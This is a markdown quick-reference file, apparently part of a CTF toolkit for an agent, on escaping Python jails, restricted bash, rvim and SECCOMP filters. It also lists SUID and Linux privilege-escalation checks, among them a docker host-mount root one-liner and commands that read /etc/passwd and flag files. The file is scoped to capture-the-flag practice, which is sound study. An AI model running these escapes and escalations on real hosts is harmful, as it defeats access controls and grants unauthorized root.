# Escaping a restricted execution context

A shell or interpreter you already reach, with the way out removed. Depth for
the two big families is in `pyjails.md` and `bashjails.md`.

**Scope note.** The last two sections are about a Linux host you have landed
on. They belong here only for a jeopardy challenge that hands you a shell and
asks for a file you cannot read yet. Privilege escalation on a machine box or
in Active Directory is out of scope for this tree and belongs to the other
toolkit - see section 7 of `AGENTS.md`.

Moved out of `SKILL.md` so the router stays thin. Content is unchanged.

---

## Python Jail Quick Reference

- **Oracle pattern:** `L()` = length, `Q(i,x)` = compare, `S(guess)` = submit. Linear or binary search.
- **Walrus bypass:** `(abcdef := "new_chars")` reassigns constraint vars
- **Decorator bypass:** `@__import__` + `@func.__class__.__dict__[__name__.__name__].__get__` for no-call, no-quotes escape
- **String join:** `open(''.join(['fl','ag.txt'])).read()` when `+` is blocked

See [pyjails.md](pyjails.md) for full techniques.


## HISTFILE Trick for Restricted Shell File Reads (BCTF 2016)

Read files without cat/less/head: `HISTFILE=/flag /bin/bash && history`, or `bash -v flag.txt` (verbose mode prints lines), or `ctypes.sh` `dlcall` for direct C library calls. See [bashjails.md](bashjails.md#histfile-trick-for-restricted-shell-file-reads-bctf-2016).


## SECCOMP High-Bit File Descriptor Bypass (33C3 CTF 2016)

`close(0x8000000000000002)` passes 64-bit SECCOMP check (≠ 2) but kernel truncates to 32-bit (== 2), closing fd 2. Next `open()` returns fd 2 for arbitrary file. Type-width mismatch between BPF filter and kernel. See [games-and-vms-3.md](games-and-vms-3.md#seccomp-bypass-via-high-bit-file-descriptor-trick-33c3-ctf-2016).


## rvim Jail Escape via Python3 (BKP 2017)

`rvim` blocks `:!` but `:python3 import os; os.system("cmd")` executes arbitrary commands. Check `:version` for `+python3`/`+lua`/`+ruby`. See [games-and-vms-3.md](games-and-vms-3.md#rvim-jail-escape-via-custom-vimrc-with-python3-execution-bkp-2017).

## SUID Binary Exploitation (0xFun 2026)

```bash
# Find SUID binaries
find / -perm -4000 2>/dev/null

# Cross-reference with GTFObins
# xxd with SUID: xxd flag.txt | xxd -r
# vim with SUID: vim -c ':!cat /flag.txt'
```

**Reference:** https://gtfobins.github.io/

---


## Linux Privilege Escalation Quick Checks

```bash
# GECOS field passwords
cat /etc/passwd  # Check 5th colon-separated field

# ACL permissions
getfacl /path/to/restricted/file

# Sudo permissions
sudo -l

# Docker group membership (instant root)
id | grep -q docker && docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```


